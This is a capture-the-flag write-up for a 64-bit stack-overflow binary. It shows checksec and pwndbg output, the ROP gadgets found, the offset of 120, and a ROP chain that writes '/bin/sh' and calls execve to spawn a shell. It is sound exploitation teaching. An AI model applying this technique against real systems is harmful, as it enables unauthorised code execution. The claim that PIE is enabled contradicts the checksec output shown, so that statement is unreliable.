# Solution

## Analysis 

1. The program notably has PIE enabled, so we need to find a way to leak out the function addresses.
   ```bash
    # checksec callservice 
    [*]
        Arch:       i386-32-little
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX unknown - GNU_STACK missing
        PIE:        No PIE (0x400000)
        Stack:      Executable
        RWX:        Has RWX segments
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    ```

    If you want the assembly code, type in this command:
    ```bash
    objdump -d -M intel --source callservice > objdump.txt
    ```

    To obtain the ROP Gadgets:
    ```bash
    ROPgadget --binary callservice > rop.txt
    ```

2. Within the ROP Gadgets, there are a few gadgets available that can be used for syscalls.
   ```asm
   0x00000000004011fe : pop rax ; ret
   0x0000000000401200 : pop rdi ; ret
   0x0000000000401202 : pop rsi ; ret
   0x0000000000401204 : pop rdx ; ret
   0x0000000000401209 : mov qword ptr [rdi], rsi ; ret
   0x0000000000401206 : syscall
   ```

3. The virtual memory shows a memory range `0x404000` to `0x405000` that is writable. This can be used to store information, such as shellcode.
   ```bash
   pwndbg> vmmap
   LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
          0x404000           0x405000 rw-p     1000   3000 callservice
   ```

4. The found offset is `120`.
   ```bash
   pwndbg> file callservice
   pwndbg> cyclic 200
   aaaaaaaabaaa...
   pwndbg> r
   Calling Services
   Help may I help you?
   1. Write feedback
   2. Call someone idk.
   3. Exit
   1
   Please enter your feedback: aaaaaaaabaaa....
   Thank you for your feedback: aaaaaaaabaaa....
   Program received signal SIGSEGV, Segmentation fault.

   0x0000000000401311 in main ()
   LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
   ────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────
    RAX  0
    RBX  0x7fffffffddd8 —▸ 0x7fffffffe151 ◂— '/root/sig25/challenges/pwn/callingforyou1/soln/callservice'
    RCX  0
    RDX  0
    RDI  0x7fffffffda70 —▸ 0x7fffffffdaa0 ◂— 'aaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaRFGBG=15'
    RSI  0x7fffffffdaa0 ◂— 'aaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaRFGBG=15'
    RBP  0x616161616161616f ('oaaaaaaa')
    RSP  0x7fffffffdcc8 ◂— 'paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
    RIP  0x401311 (main+249) ◂— ret 
   ─────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────
    ► 0x401311 <main+249>    ret                                <0x6161616161616170>
       ↓

   pwndbg> cyclic -l 0x6161616161616170
   Finding cyclic pattern of 8 bytes: b'paaaaaaa' (hex: 0x7061616161616161)
   Found at offset 120
   ```

## Payload Creation

The payload should follow this structure:

- 120 `b'A'`'s
- `pop rdi ; ret` | Pointer to where the shellcode is stored (within `0x404000` - `0x405000`)
- `pop rsi ; ret` | Actual shellcode contents (`/bin/sh`)
- `mov qword ptr [rdi], rsi ; ret` [Moving the contents in `RSI` to where `RDI` is pointed to]
- `pop rax ; ret` | `RAX`
- `pop rdi ; ret` | `RDI`
- `pop rsi ; ret` | `RSI`
- `pop rdx ; ret` | `RDX`
- `syscall ;`

## Exploiting

Have a look at the [`soln.py`](./soln.py) to see the full script and how it was created.